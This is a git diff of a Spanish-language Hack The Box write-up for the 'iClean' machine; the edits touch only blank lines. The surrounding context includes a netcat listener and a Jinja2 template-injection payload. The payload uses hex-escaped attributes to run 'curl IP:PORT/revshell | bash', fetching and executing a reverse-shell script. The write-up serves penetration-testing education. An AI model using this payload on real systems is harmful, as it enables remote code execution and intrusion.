@@ -103,6 +103,7 @@ descubriendo un directorio "**/dashboard**", así que con la cookie seteada proc
 vemos qué estamos ante un **Sistema de factura,** el cual podemos escanear **códigos QR's**, editar servicios, entre otras cosas... me pongo a investigar & probar cosas..
 
 empiezo generando una factura..
+
 ![](/assets/images/htb-writeup-iclean/Pasted image 20240605171335.png)
 
 eso me genera un **ID**, intuyo que este ID lo necesitaremos para algo, sigo indaganado..
@@ -144,7 +145,6 @@ nc -nlvp PORT
 5. Usamos este payload en la solicitud:
 ```bash
 {{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("curl IP:PORT/revshell | bash")|attr("read")()}}
-
 ```
 
 ![](/assets/images/htb-writeup-iclean/Pasted image 20240605173635.png)
